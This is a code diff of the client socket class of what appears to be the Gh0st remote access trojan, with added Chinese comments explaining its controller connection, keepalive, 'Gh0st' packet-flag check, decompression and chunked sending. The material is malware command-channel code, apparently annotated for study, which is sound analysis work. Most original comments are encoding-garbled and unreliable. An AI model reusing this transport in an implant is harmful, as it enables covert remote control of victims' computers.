@@ -47,9 +47,9 @@ CClientSocket::~CClientSocket()
 
 bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
 {
-	// Ò»¶¨ÒªÇå³ýÒ»ÏÂ£¬²»È»socket»áºÄ¾¡ÏµÍ³×ÊÔ´
+	// ä¸€å®šè¦æ¸…é™¤ä¸€ä¸‹ï¼Œä¸ç„¶socketä¼šè€—å°½ç³»ç»Ÿèµ„æº
 	Disconnect();
-	// ÖØÖÃÊÂ¼þ¶ÔÏñ
+	// é‡ç½®äº‹ä»¶å¯¹åƒ
 	ResetEvent(m_hEvent);
 	m_bIsRunning = false;
 
@@ -71,7 +71,7 @@ bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
 	if (pHostent == NULL)
 		return false;
 	
-	// ¹¹Ôìsockaddr_in½á¹¹
+	// æž„é€ sockaddr_inç»“æž„
 	sockaddr_in	ClientAddr;
 	ClientAddr.sin_family	= AF_INET;
 	if (m_nProxyType != PROXY_NONE)
@@ -83,27 +83,27 @@ bool CClientSocket::Connect(LPCTSTR lpszHost, UINT nPort)
 
 	if (connect(m_Socket, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)   
 		return false;
-// ½ûÓÃNagleËã·¨ºó£¬¶Ô³ÌÐòÐ§ÂÊÓÐÑÏÖØÓ°Ïì
+// ç¦ç”¨Nagleç®—æ³•åŽï¼Œå¯¹ç¨‹åºæ•ˆçŽ‡æœ‰ä¸¥é‡å½±å“
 // The Nagle algorithm is disabled if the TCP_NODELAY option is enabled 
 //   const char chOpt = 1;
 // 	int nErr = setsockopt(m_Socket, IPPROTO_TCP, TCP_NODELAY, &chOpt, sizeof(char));
 
-	// ÑéÖ¤socks5·þÎñÆ÷
+	// éªŒè¯socks5æœåŠ¡å™¨
 	if (m_nProxyType == PROXY_SOCKS_VER5 && !ConnectProxyServer(lpszHost, nPort))
 	{
 		return false;
 	}
-	// ²»ÓÃ±£»î»úÖÆ£¬×Ô¼ºÓÃÐÄÌøÊµÈð
+	// ä¸ç”¨ä¿æ´»æœºåˆ¶ï¼Œè‡ªå·±ç”¨å¿ƒè·³å®žç‘ž
 	
 	const char chOpt = 1; // True
-	// Set KeepAlive ¿ªÆô±£»î»úÖÆ, ·ÀÖ¹·þÎñ¶Ë²úÉúËÀÁ¬½Ó
+	// Set KeepAlive å¼€å¯ä¿æ´»æœºåˆ¶, é˜²æ­¢æœåŠ¡ç«¯äº§ç”Ÿæ­»è¿žæŽ¥
 	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&chOpt, sizeof(chOpt)) == 0)
 	{
-		// ÉèÖÃ³¬Ê±ÏêÏ¸ÐÅÏ¢
+		// è®¾ç½®è¶…æ—¶è¯¦ç»†ä¿¡æ¯
 		tcp_keepalive	klive;
-		klive.onoff = 1; // ÆôÓÃ±£»î
-		klive.keepalivetime = 1000 * 60 * 3; // 3·ÖÖÓ³¬Ê± Keep Alive
-		klive.keepaliveinterval = 1000 * 5; // ÖØÊÔ¼ä¸ôÎª5Ãë Resend if No-Reply
+		klive.onoff = 1; // å¯ç”¨ä¿æ´»
+		klive.keepalivetime = 1000 * 60 * 3; // 3åˆ†é’Ÿè¶…æ—¶ Keep Alive
+		klive.keepaliveinterval = 1000 * 5; // é‡è¯•é—´éš”ä¸º5ç§’ Resend if No-Reply
 		WSAIoctl
 			(
 			m_Socket, 
@@ -244,10 +244,11 @@ DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)
 	fd_set fdSocket;
 	FD_ZERO(&fdSocket);
 	FD_SET(pThis->m_Socket, &fdSocket);
-	while (pThis->IsRunning())
+
+	while (pThis->IsRunning()) // ä¸»æŽ§ç«¯æ²’é—œæŽ‰å°±ä¸€ç›´åœ¨é€™å€‹loop
 	{
 		fd_set fdRead = fdSocket;
-		int nRet = select(NULL, &fdRead, NULL, NULL, NULL);
+		int nRet = select(NULL, &fdRead, NULL, NULL, NULL); // åˆ¤æ–·æ˜¯ä¸æ˜¯æ–·é–‹é€£çµ
 		if (nRet == SOCKET_ERROR)
 		{
 			pThis->Disconnect();
@@ -256,13 +257,14 @@ DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)
 		if (nRet > 0)
 		{
 			memset(buff, 0, sizeof(buff));
-			int nSize = recv(pThis->m_Socket, buff, sizeof(buff), 0);
+			int nSize = recv(pThis->m_Socket, buff, sizeof(buff), 0);// æŽ¥æ”¶ä¸»æŽ§ç«¯å‚³ä¾†çš„data
+			
 			if (nSize <= 0)
 			{
-				pThis->Disconnect();
+				pThis->Disconnect(); // æœƒæœ‰ä¸€äº›æŽ¥æ”¶éŒ¯èª¤çš„è™•ç†
 				break;
 			}
-			if (nSize > 0) pThis->OnRead((LPBYTE)buff, nSize);
+			if (nSize > 0) pThis->OnRead((LPBYTE)buff, nSize); //æŽ¥æ”¶æ²’å•é¡Œå°±call OnRead()
 		}
 	}
 
@@ -290,7 +292,7 @@ void CClientSocket::OnRead( LPBYTE lpBuffer, DWORD dwIoSize )
 		}
 		if (dwIoSize == FLAG_SIZE && memcmp(lpBuffer, m_bPacketFlag, FLAG_SIZE) == 0)
 		{
-			// ÖØÐÂ·¢ËÍ	
+			// é‡æ–°å‘é€	
 			Send(m_ResendWriteBuffer.GetBuffer(), m_ResendWriteBuffer.GetBufferLen());
 			return;
 		}
@@ -305,17 +307,19 @@ void CClientSocket::OnRead( LPBYTE lpBuffer, DWORD dwIoSize )
 			BYTE bPacketFlag[FLAG_SIZE];
 			CopyMemory(bPacketFlag, m_CompressionBuffer.GetBuffer(), sizeof(bPacketFlag));
 			
+			// ç¢ºå®špacketçš„é–‹é ­å‰5 bytes æ˜¯Gh0st
 			if (memcmp(m_bPacketFlag, bPacketFlag, sizeof(m_bPacketFlag)) != 0)
 				throw "bad buffer";
 			
 			int nSize = 0;
 			CopyMemory(&nSize, m_CompressionBuffer.GetBuffer(FLAG_SIZE), sizeof(int));
 			
-
+			// åˆ¤æ–·æ•¸æ“šå¤§å°
 			if (nSize && (m_CompressionBuffer.GetBufferLen()) >= nSize)
 			{
 				int nUnCompressLength = 0;
 				// Read off header
+				// è®€ flag, è³‡æ–™å¤§å°, å£“ç¸®å‰å¤§å°
 				m_CompressionBuffer.Read((PBYTE) bPacketFlag, sizeof(bPacketFlag));
 				m_CompressionBuffer.Read((PBYTE) &nSize, sizeof(int));
 				m_CompressionBuffer.Read((PBYTE) &nUnCompressLength, sizeof(int));
@@ -330,17 +334,19 @@ void CClientSocket::OnRead( LPBYTE lpBuffer, DWORD dwIoSize )
 				
 				if (pData == NULL || pDeCompressionData == NULL)
 					throw "bad Allocate";
-
+				// è®€ æ•¸æ“š
 				m_CompressionBuffer.Read(pData, nCompressLength);
 				
 				//////////////////////////////////////////////////////////////////////////
 				unsigned long	destLen = nUnCompressLength;
 				int	nRet = uncompress(pDeCompressionData, &destLen, pData, nCompressLength);
 				//////////////////////////////////////////////////////////////////////////
+				// è§£å£“æˆåŠŸæœƒ call OnReceive
 				if (nRet == Z_OK)
 				{
 					m_DeCompressionBuffer.ClearBuffer();
 					m_DeCompressionBuffer.Write(pDeCompressionData, destLen);
+					
 					m_pManager->OnReceive(m_DeCompressionBuffer.GetBuffer(0), m_DeCompressionBuffer.GetBufferLen());
 				}
 				else
@@ -414,22 +420,22 @@ int CClientSocket::Send( LPBYTE lpData, UINT nSize )
 		m_WriteBuffer.Write(pDest, destLen);
 		delete [] pDest;
 		
-		// ·¢ËÍÍêºó£¬ÔÙ±¸·ÝÊý¾Ý, ÒòÎªÓÐ¿ÉÄÜÊÇm_ResendWriteBuffer±¾ÉíÔÚ·¢ËÍ,ËùÒÔ²»Ö±½ÓÐ´Èë
+		// å‘é€å®ŒåŽï¼Œå†å¤‡ä»½æ•°æ®, å› ä¸ºæœ‰å¯èƒ½æ˜¯m_ResendWriteBufferæœ¬èº«åœ¨å‘é€,æ‰€ä»¥ä¸ç›´æŽ¥å†™å…¥
 		LPBYTE lpResendWriteBuffer = new BYTE[nSize];
 		CopyMemory(lpResendWriteBuffer, lpData, nSize);
 		m_ResendWriteBuffer.ClearBuffer();
-		m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// ±¸·Ý·¢ËÍµÄÊý¾Ý
+		m_ResendWriteBuffer.Write(lpResendWriteBuffer, nSize);	// å¤‡ä»½å‘é€çš„æ•°æ®
 		if (lpResendWriteBuffer)
 			delete [] lpResendWriteBuffer;
 	}
-	else // ÒªÇóÖØ·¢, Ö»·¢ËÍFLAG
+	else // è¦æ±‚é‡å‘, åªå‘é€FLAG
 	{
 		m_WriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));
 		m_ResendWriteBuffer.ClearBuffer();
-		m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// ±¸·Ý·¢ËÍµÄÊý¾Ý	
+		m_ResendWriteBuffer.Write(m_bPacketFlag, sizeof(m_bPacketFlag));	// å¤‡ä»½å‘é€çš„æ•°æ®	
 	}
 
-	// ·Ö¿é·¢ËÍ
+	// åˆ†å—å‘é€
 	return SendWithSplit(m_WriteBuffer.GetBuffer(), m_WriteBuffer.GetBufferLen(), MAX_SEND_BUFFER);
 }
 
@@ -441,7 +447,7 @@ int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
 	int			size = 0;
 	int			nSend = 0;
 	int			nSendRetry = 15;
-	// ÒÀ´Î·¢ËÍ
+	// ä¾æ¬¡å‘é€
 	for (size = nSize; size >= nSplitSize; size -= nSplitSize)
 	{
 		for (int i = 0; i < nSendRetry; i++)
@@ -455,9 +461,9 @@ int CClientSocket::SendWithSplit(LPBYTE lpData, UINT nSize, UINT nSplitSize)
 		
 		nSend += nRet;
 		pbuf += nSplitSize;
-		Sleep(10); // ±ØÒªµÄSleep,¹ý¿ì»áÒýÆð¿ØÖÆ¶ËÊý¾Ý»ìÂÒ
+		Sleep(10); // å¿…è¦çš„Sleep,è¿‡å¿«ä¼šå¼•èµ·æŽ§åˆ¶ç«¯æ•°æ®æ··ä¹±
 	}
-	// ·¢ËÍ×îºóµÄ²¿·Ö
+	// å‘é€æœ€åŽçš„éƒ¨åˆ†
 	if (size > 0)
 	{
 		for (int i = 0; i < nSendRetry; i++)
